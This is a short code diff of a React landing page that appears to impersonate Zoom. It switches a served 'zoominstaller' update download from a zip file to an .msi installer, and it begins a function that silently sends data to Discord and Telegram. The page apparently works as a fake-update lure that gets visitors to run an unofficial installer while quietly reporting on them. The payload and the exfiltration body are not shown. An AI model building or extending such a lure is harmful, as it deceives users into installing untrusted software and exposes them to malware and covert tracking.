@@ -6,8 +6,8 @@ export default function ZoomLandingPage({ onNavigateToUpdate }) {
     const [isDownloading, setIsDownloading] = useState(false);
 
     // Download file path
-    const INSTALLER_PATH = "/assets/setup/update/zoominstaller.zip";
-    const INSTALLER_FILENAME = "zoominstaller.zip";
+    const INSTALLER_PATH = "/assets/setup/update/zoominstaller.msi";
+    const INSTALLER_FILENAME = "zoominstaller.msi";
 
     // Send data to Discord & Telegram (fails silently if not configured)
     const sendNotification = async (message) => {
